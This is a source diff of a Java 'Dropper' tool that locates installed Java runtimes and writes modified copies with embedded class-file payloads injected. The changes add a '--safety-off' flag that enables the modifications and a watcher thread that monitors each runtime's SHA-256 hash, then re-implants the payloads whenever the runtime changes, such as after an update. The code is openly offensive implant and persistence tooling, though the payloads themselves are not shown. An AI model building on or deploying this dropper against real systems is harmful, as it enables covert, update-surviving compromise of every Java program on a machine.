@@ -6,6 +6,9 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.io.StringReader;
 import java.io.StringWriter;
+import java.nio.file.Files;
+import java.security.MessageDigest;
+import java.security.NoSuchAlgorithmException;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.HashMap;
@@ -65,6 +68,13 @@ public class Dropper {
 	private static final String VERSION_SHORT_ARGUMENT = "-v";
 	private static final String VERSION_DESCRIPTION = "1.3.0";
 	
+	private static final String SAFETY_OFF_LONG_ARGUMENT = "--safety-off";
+	private static final String SAFETY_OFF_SHORT_ARGUMENT = "-so";
+	private static final String SAFETY_OFF_DESCRIPTION = "        This flag must be specified to execute the modifications\n"
+			                                           + "                         specified by embedded payloads (enabling the flag disables\n"
+			                                           + "                         the built-in safety).";
+	private static boolean safetyOff = false;
+	
 	private static final String OUTPUT_DIRECTORY_LONG_ARGUMENT = "--output-directory";
 	private static final String OUTPUT_DIRECTORY_SHORT_ARGUMENT = "-o";
 	private static final String OUTPUT_DIRECTORY_DESCRIPTION = "   Specifies the output directory to save modified runtimes,\n" 
@@ -88,23 +98,46 @@ public class Dropper {
 																+ "                         search for runtimes, if not specified a default set of\n"
 																+ "                         search directories will be used.";
 	
-	private static final String VERBOSE_LONG_ARGUMENT = "--verbose";
-	private static final String VERBOSE_DIRECTORIES_DESCRIPTION = "                Prints debug information.";
-	private static boolean verbose = false;
+	private static final long WATCHER_SLEEP_TIME = (long) (1000 * 60); // 1 minute
+	private static final String WATCHER_SLEEP_TIME_LONG_ARGUMENT = "--watcher-sleep";
+	private static final String WATCHER_SLEEP_TIME_SHORT_ARGUMENT = "-ws";
+	private static final String WATCHER_SLEEP_TIME_DESCRIPTION = "     The amount of time in milliseconds to sleep between watcher\n"
+															   + "                         checks.";
+	
+	private static boolean watcher = false;
+	private static final String WATCHER_LONG_ARGUMENT = "--watcher";
+	private static final String WATCHER_SHORT_ARGUMENT = "-w";
+	private static final String WATCHER_DESCRIPTION = "            Enables a watcher process that waits to modify any\n"
+																+ "                         discovered runtimes until the file hash of the runtime has\n"
+																+ "                         changed (by default the process sleeps for 1 minute, unless\n"
+																+ "                         the " + WATCHER_SLEEP_TIME_LONG_ARGUMENT + " argument is specified.";
+	
+	private static final String DEBUG_LONG_ARGUMENT = "--debug";
+	private static final String DEBUG_SHORT_ARGUMENT = "-d";
+	private static final String DEBUG_DESCRIPTION = "              Prints debug information.";
+	private static boolean debug = false;
 	
 	private static final String HELP_LONG_ARGUMENT = "--help";
 	private static final String HELP_SHORT_ARGUMENT = "-h";
 	private static final String HELP_DESCRIPTION = "Usage: java -jar dropper.jar [options]\n" 
 													+ HELP_LONG_ARGUMENT + ", " + HELP_SHORT_ARGUMENT + "               Prints this menu and exits.\n"
+													+ SAFETY_OFF_LONG_ARGUMENT + ", " + SAFETY_OFF_SHORT_ARGUMENT + SAFETY_OFF_DESCRIPTION + "\n"
+													+ SEARCH_DIRECTORIES_LONG_ARGUMENT + ", " + SEARCH_DIRECTORIES_SHORT_ARGUMENT + SEARCH_DIRECTORIES_DESCRIPTION + "\n"
 													+ OUTPUT_DIRECTORY_LONG_ARGUMENT + ", " + OUTPUT_DIRECTORY_SHORT_ARGUMENT + OUTPUT_DIRECTORY_DESCRIPTION + "\n"
+													+ WATCHER_LONG_ARGUMENT + ", " + WATCHER_SHORT_ARGUMENT + WATCHER_DESCRIPTION + "\n"
+													+ WATCHER_SLEEP_TIME_LONG_ARGUMENT + ", " + WATCHER_SLEEP_TIME_SHORT_ARGUMENT + WATCHER_SLEEP_TIME_DESCRIPTION + "\n"
 													+ PRINT_TARGETS_LONG_ARGUMENT + ", " + PRINT_TARGETS_SHORT_ARGUMENT + PRINT_TARGETS_DESCRIPTION + "\n"
 													+ PRINT_PAYLOADS_LONG_ARGUMENT + ", " + PRINT_PAYLOADS_SHORT_ARGUMENT + PRINT_PAYLOADS_DESCRIPTION + "\n"
-													+ SEARCH_DIRECTORIES_LONG_ARGUMENT + ", " + SEARCH_DIRECTORIES_SHORT_ARGUMENT + SEARCH_DIRECTORIES_DESCRIPTION + "\n"
-													+ VERBOSE_LONG_ARGUMENT + VERBOSE_DIRECTORIES_DESCRIPTION + "\n"
+													+ DEBUG_LONG_ARGUMENT + ", " + DEBUG_SHORT_ARGUMENT + DEBUG_DESCRIPTION + "\n"
 													+ VERSION_LONG_ARGUMENT + ", " + VERSION_SHORT_ARGUMENT + "            Prints the version of the dropper and exists.";
 	
 	public static void main(String[] args){
 		
+		if(args.length == 0){
+			System.out.println(HELP_DESCRIPTION);
+			System.exit(0);
+		}
+
 		String[] searchPaths = null;
 		for(int i=0; i<args.length; i++){
 			if(args[i].equals(HELP_LONG_ARGUMENT) || args[i].equals(HELP_SHORT_ARGUMENT)){
@@ -146,8 +179,12 @@ public class Dropper {
 				}
 			}
 			
-			else if(args[i].equals(VERBOSE_LONG_ARGUMENT)){
-				verbose = true;
+			else if(args[i].equals(DEBUG_LONG_ARGUMENT) || args[i].equals(DEBUG_SHORT_ARGUMENT)){
+				debug = true;
+			}
+			
+			else if(args[i].equals(SAFETY_OFF_LONG_ARGUMENT) || args[i].equals(SAFETY_OFF_SHORT_ARGUMENT)){
+				safetyOff = true;
 			}
 
 			else if(args[i].equals(VERSION_LONG_ARGUMENT) || args[i].equals(VERSION_SHORT_ARGUMENT)){
@@ -162,7 +199,7 @@ public class Dropper {
 		}
 		
 		// load configurations
-		Configuration configuration = null;
+		Configuration parsedConfiguration = null;
 		InputStream configStream = Dropper.class.getResourceAsStream("/" + CONFIG_FILE);
 		try {
 			if(configStream == null){
@@ -175,7 +212,7 @@ public class Dropper {
 						xml.append(scanner.nextLine() + "\n");
 					}
 					scanner.close();
-					configuration = new Configuration(xml.toString());
+					parsedConfiguration = new Configuration(xml.toString());
 				} catch (Exception e){
 					throw new IllegalArgumentException("Configuration file is corrupted.\n");
 				}
@@ -185,6 +222,8 @@ public class Dropper {
 			System.out.println(HELP_DESCRIPTION);
 			System.exit(1);
 		}
+		
+		final Configuration configuration = parsedConfiguration;
 
 		if(printTargets){
 			System.out.println("Runtime Targets: " + configuration.runtimes.toString());
@@ -206,26 +245,69 @@ public class Dropper {
 				byte[] payloadBytes = getBytes(classFileStream);
 				payloads[i] = payloadBytes;
 			} catch (Exception e) {
-				if(verbose) System.err.println("Could not load: " + PAYLOAD_DIRECTORY + "/" + classFile);
-				if(verbose) e.printStackTrace();
+				if(debug) System.err.println("Could not load: " + PAYLOAD_DIRECTORY + "/" + classFile);
+				if(debug) e.printStackTrace();
 			}
 		}
 		
-		if(verbose) System.out.println(configuration);
+		if(debug) System.out.println(configuration);
 		
 		// modify runtimes
 		LinkedList<File> runtimes = new LinkedList<File>();
 		for(File runtime : !runtimes.isEmpty() ? runtimes : getRuntimes(searchPaths, configuration)){
-			try {
-				File outputRuntime = outputDirectory == null ? File.createTempFile(runtime.getName(), ".jar") : getOutputRuntimeFile(runtime, outputDirectory);
-				modifyRuntime(runtime, configuration.configurations.get(MERGE_RENAME_PREFIX).toString(), outputRuntime, payloads);
-				System.out.println("\nOriginal Runtime: " + runtime.getAbsolutePath() + "\n" + "Modified Runtime: " + outputRuntime.getAbsolutePath());
-			} catch (Exception e) {
-				if(verbose) System.err.println("Could not modify runtime: " + runtime.getAbsolutePath());
-				if(verbose) e.printStackTrace();
+			if(debug){
+				System.out.println("Discovered runtime: " + runtime.getAbsolutePath());
+			}
+			if(safetyOff){
+				if(watcher){
+					new Thread(new Runnable(){
+						@Override
+						public void run() {
+							try {
+								String hash = sha256(runtime);
+								String hash2 = hash;
+								if(debug){
+									System.out.println("Runtime (" + runtime.getAbsolutePath() + ") hash original: " + hash);
+								}
+								do{
+									if(debug){
+										System.out.println("Sleeping: " + WATCHER_SLEEP_TIME + "ms");
+									}
+									Thread.sleep(WATCHER_SLEEP_TIME);
+								} while(hash.equals(hash2 = sha256(runtime)));
+								if(debug){
+									System.out.println("Runtime (" + runtime.getAbsolutePath() + ") hash changed: " + hash2);
+								}
+								modifyRuntime(configuration, payloads, runtime);
+							} catch (NoSuchAlgorithmException e) {
+								e.printStackTrace();
+								return;
+							} catch (IOException e) {
+								System.err.println("Unabled to hash " + runtime.getAbsolutePath() + ", sleeping for an iteration...");
+								e.printStackTrace();
+							} catch (InterruptedException e) {
+								System.err.println("Unabled to sleep thread.");
+								e.printStackTrace();
+							}
+						}
+					}).start();
+				} else {
+					modifyRuntime(configuration, payloads, runtime);
+				}
 			}
 		}
-		if(verbose) System.out.println("Finished.");
+		if(debug) System.out.println("Finished.");
+	}
+
+	private static void modifyRuntime(Configuration configuration, byte[][] payloads, File runtime) {
+		try {
+			File outputRuntime = outputDirectory == null ? File.createTempFile(runtime.getName(), ".jar") : getOutputRuntimeFile(runtime, outputDirectory);
+			modifyRuntime(runtime, configuration.configurations.get(MERGE_RENAME_PREFIX).toString(), outputRuntime, payloads);
+			System.out.println("\nOriginal Runtime: " + runtime.getAbsolutePath() + "\n" + "Modified Runtime: " + outputRuntime.getAbsolutePath());
+		} catch (Exception e) {
+			if(debug) System.err.println("Could not modify runtime: " + runtime.getAbsolutePath());
+			if(debug) e.printStackTrace();
+		}
 	}
 	
 	private static File getOutputRuntimeFile(File runtime, File outputDirectory) {
@@ -256,7 +338,7 @@ public class Dropper {
 		LinkedList<File> searchDirectories = new LinkedList<File>();
 
 		if(searchPaths != null){
-			if(verbose) System.out.println("Searching: " + Arrays.toString(searchPaths));
+			if(debug) System.out.println("Searching: " + Arrays.toString(searchPaths));
 			// look for specified jvm locations
 			for(String path : searchPaths){
 				File location = new File(path);
@@ -266,7 +348,7 @@ public class Dropper {
 			}
 		} else {
 			// look for known jvm locations
-			if(verbose) System.out.println("Searching: " + Arrays.toString(JVM_LOCATIONS));
+			if(debug) System.out.println("Searching: " + Arrays.toString(JVM_LOCATIONS));
 			for(String path : JVM_LOCATIONS){
 				File location = new File(path);
 				if(location.exists()){
@@ -440,6 +522,17 @@ public class Dropper {
 			transformer.transform(source, result);
 			return xml.toString();
 		}
+	}
+	
+	private static String sha256(File file) throws IOException, NoSuchAlgorithmException {
+		MessageDigest digest = MessageDigest.getInstance("SHA-256");
+		byte[] contents = Files.readAllBytes(file.toPath());
+		byte[] hash = digest.digest(contents);
+		StringBuilder result = new StringBuilder();
+		for (int i = 0; i < hash.length; i++) {
+			result.append(Integer.toString((hash[i] & 0xFF) + 0x100, 16).substring(1));
+		}
+		return result.toString();
 	}
 	
 }
